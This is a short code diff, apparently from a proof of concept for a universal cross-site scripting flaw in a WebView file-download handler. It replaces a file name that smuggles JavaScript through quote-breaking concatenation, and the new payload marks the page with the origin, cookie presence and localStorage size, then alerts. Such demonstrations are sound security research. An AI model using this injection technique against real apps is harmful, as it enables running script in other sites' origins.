@@ -5,7 +5,7 @@
      new Blob(['UXSS'], {type: 'text/plain'})
    );
  
- const fileName = `'+(()=>{alert(window.origin);return""})()+'`;
+ const fileName = `'+(()=>{let e=document.createElement("mark");e.id="max-uxss-marker";e.textContent="UXSS@"+location.origin+" c="+!!document.cookie+" l="+localStorage.length;document.title=e.textContent;document.documentElement.prepend(e);alert(1);alert(window.origin);return""})()+'`;
  
  window.WebViewHandler.postEvent(
    'WebAppDownloadFile',
